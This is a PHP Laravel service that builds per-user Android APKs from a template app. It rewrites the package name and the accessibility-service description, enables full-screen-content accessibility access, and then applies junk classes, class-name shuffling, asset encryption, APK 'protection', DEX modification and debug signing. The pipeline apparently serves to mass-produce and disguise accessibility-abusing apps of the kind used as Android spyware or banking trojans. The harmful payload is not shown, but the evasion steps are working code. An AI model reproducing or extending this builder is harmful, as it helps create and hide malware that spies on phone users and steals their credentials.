<?php

declare(strict_types=1);

namespace App\Services\ApkBuilder;

use App\Exceptions\ApkBuilder\ApkBuildException;
use Illuminate\Support\Facades\File;
use Illuminate\Support\Facades\Log;
use Illuminate\Support\Facades\Process;
use RecursiveDirectoryIterator;
use RecursiveIteratorIterator;

final class ApkBuilder
{
    private string $templateDir;
    private string $stubZipPath;
    private string $toolsDir;
    private string $outputDir;
    private string $workDir = '';
    private string $buildDir = '';
    private string $assetsKey = '';
    private array $stepStats = [];
    private float $startTime;
    private bool $buildSucceeded = false;
    private ?\Closure $progressCallback = null;

    public const STEP_LABELS = [
        'check_dependencies' => '检查依赖',
        'prepare_work_dir' => '准备工作目录',
        'modify_smali' => '修改配置',
        'modify_manifest' => '修改清单',
        'modify_resources' => '修改资源',
        'replace_icon' => '替换图标',
        'replace_background' => '替换背景',
        'generate_junk_classes' => '生成混淆类',
        'shuffle_classes' => '混淆类名',
        'encrypt_resources' => '加密资源',
        'build_apk' => '打包 APK',
        'protect_apk' => 'APK 保护',
        'modify_dex' => 'DEX 修改',
        'sign_apk' => '签名',
        'move_output' => '输出文件',
    ];

    public function __construct()
    {
        $this->templateDir = config('apk-builder.template_path');
        $this->stubZipPath = config('apk-builder.stub_zip_path');
        $this->toolsDir = config('apk-builder.tools_path');
        $this->outputDir = config('apk-builder.output_path');
    }

    public function buildWithProgress(ApkBuildConfig $config, callable $onProgress): ApkBuildResult
    {
        $this->progressCallback = \Closure::fromCallable($onProgress);

        try {
            return $this->build($config);
        } finally {
            $this->progressCallback = null;
        }
    }

    /**
     * @throws ApkBuildException
     */
    public function build(ApkBuildConfig $config): ApkBuildResult
    {
        $this->startTime = microtime(true);
        $this->stepStats = [];

        Log::channel('apk')->info('Build started', ['app_id' => $config->appId, 'user_id' => $config->userId]);

        try {
            $errors = $config->validate();
            if (!empty($errors)) {
                throw ApkBuildException::configValidationFailed($errors);
            }

            $this->runStep('check_dependencies', fn() => $this->checkDependencies());
            $this->runStep('prepare_work_dir', fn() => $this->prepareWorkDir());
            $this->runStep('modify_smali', fn() => $this->modifySmali($config));
            $this->runStep('modify_manifest', fn() => $this->modifyManifest($config));
            $this->runStep('modify_resources', fn() => $this->modifyResources($config));
            $this->runStep('replace_icon', fn() => $this->replaceIcon($config));
            $this->runStep('replace_background', fn() => $this->replaceBackground($config));

            if ($config->enableJunkClasses) {
                $this->runStep('generate_junk_classes', fn() => $this->generateJunkClasses($config));
            }

            if ($config->enableClassShuffle) {
                $this->runStep('shuffle_classes', fn() => $this->shuffleClasses());
            }

            $this->runStep('encrypt_resources', fn() => $this->encryptResources());
            $this->runStep('build_apk', fn() => $this->buildApk());

            if ($config->enableApkProtection) {
                $this->runStep('protect_apk', fn() => $this->protectApk());
            }

            if ($config->enableDexModification) {
                $this->runStep('modify_dex', fn() => $this->modifyDex());
            }

            $this->runStep('sign_apk', fn() => $this->signApk());
            $outputPath = $this->runStep('move_output', fn() => $this->moveToOutput($config));

            $this->buildSucceeded = true;
            $this->cleanup();

            $totalTime = $this->getTotalTime();
            Log::channel('apk')->info('Build completed', [
                'app_id' => $config->appId,
                'output_path' => $outputPath,
                'total_time_ms' => $totalTime,
            ]);

            return new ApkBuildResult(
                path: $outputPath,
                stats: $this->stepStats,
                totalTimeMs: $totalTime,
            );
        } catch (ApkBuildException $e) {
            Log::channel('apk')->error('Build failed', [
                'app_id' => $config->appId,
                'error' => $e->getMessage(),
                'context' => $e->context,
            ]);

            $this->emitProgress([
                'type' => 'error',
                'error' => $e->getMessage(),
            ]);

            $this->buildSucceeded = false;
            $this->cleanup();
            throw $e;
        } catch (\Throwable $e) {
            Log::channel('apk')->error('Build failed with unexpected error', [
                'app_id' => $config->appId,
                'error' => $e->getMessage(),
                'trace' => $e->getTraceAsString(),
            ]);

            $this->emitProgress([
                'type' => 'error',
                'error' => $e->getMessage(),
            ]);

            $this->buildSucceeded = false;
            $this->cleanup();
            throw new ApkBuildException($e->getMessage(), [], 0, $e);
        }
    }

    private function runStep(string $name, callable $action): mixed
    {
        $stepStart = microtime(true);
        Log::channel('apk')->debug("Starting step: {$name}");

        $this->emitProgress([
            'type' => 'step',
            'step' => $name,
            'label' => self::STEP_LABELS[$name] ?? $name,
            'status' => 'running',
        ]);

        $result = $action();

        $duration = round((microtime(true) - $stepStart) * 1000, 2);
        $this->stepStats[$name] = $duration;
        Log::channel('apk')->debug("Completed step: {$name}", ['duration_ms' => $duration]);

        $this->emitProgress([
            'type' => 'step',
            'step' => $name,
            'label' => self::STEP_LABELS[$name] ?? $name,
            'status' => 'done',
            'duration' => $duration,
        ]);

        return $result;
    }

    private function emitProgress(array $data): void
    {
        if ($this->progressCallback) {
            ($this->progressCallback)($data);
        }
    }

    /**
     * 发送心跳消息（用于长时间运行的操作）
     */
    private function emitHeartbeat(): void
    {
        $this->emitProgress(['type' => 'heartbeat']);
    }

    private function getTotalTime(): float
    {
        return round((microtime(true) - $this->startTime) * 1000, 2);
    }

    private function checkDependencies(): void
    {
        // 如果模板目录不存在，尝试从 ZIP 文件解压
        if (!File::isDirectory($this->templateDir)) {
            $this->extractTemplateFromZip();
        }

        if (!File::isDirectory($this->templateDir)) {
            throw ApkBuildException::templateNotFound($this->templateDir);
        }

        $apktoolPath = $this->toolsDir . '/apktool.jar';
        if (!File::exists($apktoolPath)) {
            throw ApkBuildException::toolNotFound('apktool.jar', $apktoolPath);
        }

        $result = Process::run('java -version');
        if (!$result->successful()) {
            throw ApkBuildException::javaNotInstalled();
        }
    }

    /**
     * 从 ZIP 文件解压模板
     * 
     * @throws ApkBuildException
     */
    private function extractTemplateFromZip(): void
    {
        if (!File::exists($this->stubZipPath)) {
            Log::channel('apk')->warning('Stub ZIP file not found', ['path' => $this->stubZipPath]);
            return;
        }

        Log::channel('apk')->info('Extracting template from ZIP', [
            'zip' => $this->stubZipPath,
            'target' => $this->templateDir,
        ]);

        $zip = new \ZipArchive();
        $result = $zip->open($this->stubZipPath);

        if ($result !== true) {
            throw new ApkBuildException("无法打开模板 ZIP 文件: {$this->stubZipPath}", [
                'error_code' => $result,
            ]);
        }

        // 确保父目录存在
        File::ensureDirectoryExists(dirname($this->templateDir));

        // 解压到模板目录
        if (!$zip->extractTo($this->templateDir)) {
            $zip->close();
            throw new ApkBuildException("解压模板 ZIP 文件失败", [
                'zip' => $this->stubZipPath,
                'target' => $this->templateDir,
            ]);
        }

        $zip->close();

        // 设置正确的目录权限，确保可读取和复制
        Process::run("chmod -R 755 " . escapeshellarg($this->templateDir));

        Log::channel('apk')->info('Template extracted successfully', ['target' => $this->templateDir]);
    }

    private function prepareWorkDir(): void
    {
        $this->cleanOldBuildCache();

        $tempPath = config('apk-builder.temp_path');
        $baseDir = !empty($tempPath) ? $tempPath : sys_get_temp_dir();

        $this->workDir = $baseDir . '/apk_build_' . uniqid();
        $this->buildDir = $this->workDir . '/apk_source';

        File::ensureDirectoryExists($this->workDir);
        $this->copyDirectory($this->templateDir, $this->buildDir);
        $this->assetsKey = Encryptor::generateKey();
    }

    private function cleanOldBuildCache(): void
    {
        $tempPath = config('apk-builder.temp_path');
        $baseDir = !empty($tempPath) ? $tempPath : sys_get_temp_dir();

        $pattern = $baseDir . '/apk_build_*';
        $oldDirs = glob($pattern, GLOB_ONLYDIR);

        foreach ($oldDirs as $dir) {
            File::deleteDirectory($dir);
        }
    }

    private function modifySmali(ApkBuildConfig $config): void
    {
        $processor = new SmaliProcessor($this->buildDir);
        $encryptor = new Encryptor();
        $processor->modifyConfig($config, $this->assetsKey, $encryptor);
    }

    private function modifyManifest(ApkBuildConfig $config): void
    {
        $manifestPath = $this->buildDir . '/AndroidManifest.xml';
        $content = File::get($manifestPath);

        $oldPackage = 'com.icontrol.protector';
        if ($oldPackage !== $config->appId) {
            $content = str_replace($oldPackage, $config->appId, $content);
            $processor = new SmaliProcessor($this->buildDir);
            $processor->renamePackage($oldPackage, $config->appId);
        }

        $content = str_replace('@drawable/mylogo', '@drawable/app_icon', $content);
        $this->fixResourceReferences($content);

        File::put($manifestPath, $content);
    }

    private function fixResourceReferences(string &$content): void
    {
        $xmlDir = $this->buildDir . '/res/xml';
        File::ensureDirectoryExists($xmlDir);

        preg_match_all('/@xml\/([a-zA-Z0-9_]+)/', $content, $matches);

        foreach (array_unique($matches[1] ?? []) as $name) {
            $file = "{$xmlDir}/{$name}.xml";

            if (File::exists($file)) {
                continue;
            }

            $existing = glob("{$xmlDir}/*.xml");

            if (!empty($existing)) {
                File::copy($existing[0], $file);
            } else {
                $defaultXml = '<?xml version="1.0" encoding="utf-8"?>' .
                    '<accessibility-service xmlns:android="http://schemas.android.com/apk/res/android" ' .
                    'android:accessibilityEventTypes="typeAllMask" ' .
                    'android:canRetrieveWindowContent="true"/>';
                File::put($file, $defaultXml);
            }
        }
    }

    private function modifyResources(ApkBuildConfig $config): void
    {
        $stringsPath = $this->buildDir . '/res/values/strings.xml';

        if (File::exists($stringsPath)) {
            $content = File::get($stringsPath);

            $content = preg_replace(
                '/<string name="BaseName">[^<]*<\/string>/',
                '<string name="BaseName">' . htmlspecialchars($config->appName) . '</string>',
                $content
            );

            $content = preg_replace(
                '/<string name="accessibility_service_description">[^<]*<\/string>/',
                '<string name="accessibility_service_description">' . htmlspecialchars($config->loginDis) . '</string>',
                $content
            );

            File::put($stringsPath, $content);
        }

        $ymlPath = $this->buildDir . '/apktool.yml';

        if (File::exists($ymlPath)) {
            $content = File::get($ymlPath);
            $versionCode = (int) str_replace('.', '', $config->appVersion) * 100;
            $content = preg_replace('/versionCode: \d+/', 'versionCode: ' . $versionCode, $content);
            $content = preg_replace('/versionName: [^\n]+/', 'versionName: ' . $config->appVersion, $content);
            File::put($ymlPath, $content);
        }
    }

    private function replaceIcon(ApkBuildConfig $config): void
    {
        $iconPath = $this->resolveIconPath($config);

        if (!$iconPath) {
            throw ApkBuildException::iconNotFound($config->iconPath ?: 'default icon');
        }

        $dirs = ['drawable', 'drawable-hdpi', 'drawable-mdpi', 'drawable-xhdpi', 'drawable-xxhdpi', 'drawable-xxxhdpi'];

        foreach ($dirs as $dir) {
            $target = $this->buildDir . '/res/' . $dir;

            if (File::isDirectory($target)) {
                File::copy($iconPath, $target . '/app_icon.png');
            }
        }

        Log::channel('apk')->debug('Icon replaced', ['icon' => $iconPath]);
    }

    private function resolveIconPath(ApkBuildConfig $config): ?string
    {
        $iconPath = $this->resolveStoragePath($config->iconPath);

        // 检查传入的文件路径是否有效
        if ($iconPath && File::exists($iconPath) && File::size($iconPath) > 100) {
            return $iconPath;
        }

        // 使用默认图标（完整路径）
        $defaultIcon = config('apk-builder.default_icon');
        if ($defaultIcon && File::exists($defaultIcon) && File::size($defaultIcon) > 100) {
            return $defaultIcon;
        }

        // 使用模板图标
        $templateIcon = $this->templateDir . '/res/drawable/mylogo.png';
        if (File::exists($templateIcon)) {
            return $templateIcon;
        }

        return null;
    }

    private function replaceBackground(ApkBuildConfig $config): void
    {
        $bgPath = $this->resolveBackgroundPath($config);

        if (!$bgPath) {
            Log::channel('apk')->debug('Using black background');
            $this->removeBlackuiResource();
            return;
        }

        $target = $this->buildDir . '/res/drawable/blackui.png';

        if (File::exists($target)) {
            File::delete($target);
        }

        File::copy($bgPath, $target);
        Log::channel('apk')->debug('Background replaced', ['source' => $bgPath]);
    }

    private function resolveBackgroundPath(ApkBuildConfig $config): ?string
    {
        $bgSource = $config->backgroundPath;

        // 'black' 或空值表示使用纯黑背景
        if (empty($bgSource) || strtolower($bgSource) === 'black') {
            return null;
        }

        $bgPath = $this->resolveStoragePath($bgSource);

        // 检查传入的文件路径是否有效
        if ($bgPath && File::exists($bgPath) && File::size($bgPath) > 100) {
            return $bgPath;
        }

        return null;
    }

    /**
     * 将 URL 路径或文件系统路径统一转换为文件系统路径
     * 
     * @param string|null $path URL 路径 (如 /storage/icons/1/xxx.png) 或文件系统路径
     * @return string|null 文件系统完整路径
     */
    private function resolveStoragePath(?string $path): ?string
    {
        if (empty($path)) {
            return null;
        }

        // 如果是以 /storage/ 开头的 URL 路径，转换为文件系统路径
        if (str_starts_with($path, '/storage/')) {
            // /storage/icons/1/xxx.png -> storage/app/public/icons/1/xxx.png
            $relativePath = substr($path, 9); // 移除 '/storage/'
            return storage_path('app/public/' . $relativePath);
        }

        // 如果已经是绝对路径，直接返回
        if (str_starts_with($path, '/')) {
            return $path;
        }

        // 其他情况，假设是相对于 storage/app/public 的路径
        return storage_path('app/public/' . $path);
    }

    private function removeBlackuiResource(): void
    {
        $blackuiPath = $this->buildDir . '/res/drawable/blackui.png';

        if (File::exists($blackuiPath)) {
            File::delete($blackuiPath);
        }

        $publicXmlPath = $this->buildDir . '/res/values/public.xml';

        if (File::exists($publicXmlPath)) {
            $content = File::get($publicXmlPath);
            $content = preg_replace(
                '/<public[^>]*type="drawable"[^>]*name="blackui"[^>]*\/>\s*/i',
                '',
                $content
            );
            File::put($publicXmlPath, $content);
        }
    }

    private function generateJunkClasses(ApkBuildConfig $config): void
    {
        $obfuscator = new Obfuscator($this->buildDir);
        $count = $obfuscator->generateJunkClasses($config->junkClassCount, $config->junkMethodCount);
        Log::channel('apk')->debug('Generated junk classes', ['count' => $count]);
    }

    private function shuffleClasses(): void
    {
        $obfuscator = new Obfuscator($this->buildDir);
        $count = $obfuscator->shuffleClassNames();
        Log::channel('apk')->debug('Shuffled class names', ['count' => $count]);
    }

    private function encryptResources(): void
    {
        $assetsPath = $this->buildDir . '/assets';

        if (!File::isDirectory($assetsPath)) {
            return;
        }

        $encryptor = new Encryptor();
        $iterator = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($assetsPath, RecursiveDirectoryIterator::SKIP_DOTS)
        );

        foreach ($iterator as $file) {
            if ($file->isFile()) {
                $content = File::get($file->getPathname());
                $encrypted = $encryptor->encryptBytes($content, $this->assetsKey);
                File::put($file->getPathname(), $encrypted);
            }
        }
    }

    private function buildApk(): void
    {
        $apktoolJar = $this->toolsDir . '/apktool.jar';
        $unsignedApk = $this->workDir . '/app-unsigned.apk';

        $command = sprintf(
            'java -jar %s b %s -o %s',
            escapeshellarg($apktoolJar),
            escapeshellarg($this->buildDir),
            escapeshellarg($unsignedApk)
        );

        $timeout = config('apk-builder.timeout', 300);
        $result = $this->runCommandWithHeartbeat($command, $timeout);

        if ($result === null || !$result->successful() || !File::exists($unsignedApk)) {
            $errorOutput = $result ? ($result->errorOutput() ?: $result->output()) : 'Command failed to execute';
            throw ApkBuildException::buildFailed('apktool', $errorOutput);
        }
    }

    private function protectApk(): void
    {
        $protector = new ApkProtector();
        $protector->protect($this->workDir . '/app-unsigned.apk');
        Log::channel('apk')->debug('APK protection applied');
    }

    private function modifyDex(): void
    {
        $protector = new ApkProtector();
        $count = $protector->modifyDex($this->workDir . '/app-unsigned.apk');
        Log::channel('apk')->debug('DEX files modified', ['count' => $count]);
    }

    private function signApk(): void
    {
        $unsignedApk = $this->workDir . '/app-unsigned.apk';
        $alignedApk = $this->workDir . '/app-aligned.apk';
        $signedApk = $this->workDir . '/app-signed.apk';

        // Use full path for Android SDK tools
        $androidSdkTools = '/opt/android-sdk/build-tools/34.0.0';
        $zipalignPath = $androidSdkTools . '/zipalign';
        $apksignerPath = $androidSdkTools . '/apksigner';

        $alignCommand = sprintf(
            '%s -f 4 %s %s',
            escapeshellarg($zipalignPath),
            escapeshellarg($unsignedApk),
            escapeshellarg($alignedApk)
        );
        $alignResult = Process::run($alignCommand);
        $apkToSign = $alignResult->successful() && File::exists($alignedApk) ? $alignedApk : $unsignedApk;

        $keystore = $this->toolsDir . '/debug.keystore';

        if (!File::exists($keystore)) {
            $this->generateKeystore($keystore);
        }

        // Method 1: Try apksigner (preferred)
        if (File::exists($apksignerPath)) {
            $command = sprintf(
                '%s sign --ks %s --ks-pass pass:android --out %s %s',
                escapeshellarg($apksignerPath),
                escapeshellarg($keystore),
                escapeshellarg($signedApk),
                escapeshellarg($apkToSign)
            );
            $result = Process::run($command);
            Log::channel('apk')->debug('apksigner result', [
                'success' => $result->successful(),
                'output' => $result->output(),
                'error' => $result->errorOutput(),
            ]);
        }

        // Method 2: Try jarsigner as fallback
        if (!File::exists($signedApk)) {
            $command = sprintf(
                'jarsigner -keystore %s -storepass android -signedjar %s %s androiddebugkey',
                escapeshellarg($keystore),
                escapeshellarg($signedApk),
                escapeshellarg($apkToSign)
            );
            $result = Process::run($command);
            Log::channel('apk')->debug('jarsigner result', [
                'success' => $result->successful(),
                'output' => $result->output(),
                'error' => $result->errorOutput(),
            ]);
        }

        if (!File::exists($signedApk)) {
            throw ApkBuildException::signingFailed('All signing methods failed');
        }
    }

    private function generateKeystore(string $path): void
    {
        $command = sprintf(
            'keytool -genkey -v -keystore %s -storepass android -alias androiddebugkey -keypass android -keyalg RSA -keysize 2048 -validity 10000 -dname "CN=Debug,O=Android,C=US"',
            escapeshellarg($path)
        );
        Process::run($command);
    }

    private function moveToOutput(ApkBuildConfig $config): string
    {
        $signedApk = $this->workDir . '/app-signed.apk';
        $outputDir = $this->outputDir . '/' . $config->userId . '/' . $config->appId;

        File::ensureDirectoryExists($outputDir);

        $outputPath = $outputDir . '/' . $config->appId . '.apk';

        if (!File::copy($signedApk, $outputPath)) {
            throw ApkBuildException::outputFailed('Failed to copy APK file');
        }

        return '/storage/apk/' . $config->userId . '/' . $config->appId . '/' . $config->appId . '.apk';
    }

    private function cleanup(): void
    {
        if (empty($this->workDir) || !File::isDirectory($this->workDir)) {
            return;
        }

        $configKey = $this->buildSucceeded ? 'cleanup_on_success' : 'cleanup_on_failure';
        $shouldCleanup = config("apk-builder.{$configKey}", true);

        if ($shouldCleanup) {
            File::deleteDirectory($this->workDir);
        }
    }

    private function copyDirectory(string $src, string $dst): void
    {
        $timeout = config('apk-builder.timeout', 300);

        // 方法 1: 使用 rsync（带心跳）
        $command = sprintf('rsync -a %s/ %s/', escapeshellarg($src), escapeshellarg($dst));
        $result = $this->runCommandWithHeartbeat($command, $timeout);

        if ($result !== null && $result->successful()) {
            return;
        }

        // 方法 2: 使用 tar（带心跳）
        $command = sprintf(
            'tar -C %s -cf - . | tar -C %s -xf -',
            escapeshellarg($src),
            escapeshellarg($dst)
        );
        File::ensureDirectoryExists($dst);
        $result = $this->runCommandWithHeartbeat($command, $timeout);

        if ($result !== null && $result->successful()) {
            return;
        }

        // 方法 3: PHP 原生复制（带心跳）
        $this->copyDirectoryWithHeartbeat($src, $dst);
    }

    /**
     * 运行命令时定期发送心跳
     */
    private function runCommandWithHeartbeat(string $command, int $timeout): ?\Illuminate\Contracts\Process\ProcessResult
    {
        $process = Process::timeout($timeout)->start($command);
        $heartbeatInterval = 10; // 每 10 秒发送一次心跳
        $lastHeartbeat = time();

        while ($process->running()) {
            // 每隔一定时间发送心跳
            if (time() - $lastHeartbeat >= $heartbeatInterval) {
                $this->emitHeartbeat();
                $lastHeartbeat = time();
            }
            usleep(100000); // 100ms
        }

        return $process->wait();
    }

    /**
     * 使用 PHP 复制目录时发送心跳
     */
    private function copyDirectoryWithHeartbeat(string $src, string $dst): void
    {
        $dirIterator = new RecursiveDirectoryIterator($src, RecursiveDirectoryIterator::SKIP_DOTS);
        $iterator = new RecursiveIteratorIterator($dirIterator, RecursiveIteratorIterator::SELF_FIRST);

        File::ensureDirectoryExists($dst);
        $count = 0;
        $heartbeatInterval = 100; // 每复制 100 个文件发送一次心跳
        $srcLen = strlen(rtrim($src, DIRECTORY_SEPARATOR)) + 1;

        foreach ($iterator as $item) {
            /** @var \SplFileInfo $item */
            $relativePath = substr($item->getPathname(), $srcLen);
            $target = $dst . DIRECTORY_SEPARATOR . $relativePath;

            if ($item->isDir()) {
                File::ensureDirectoryExists($target);
            } else {
                File::copy($item->getPathname(), $target);
            }

            $count++;
            if ($count % $heartbeatInterval === 0) {
                $this->emitHeartbeat();
            }
        }
    }
}
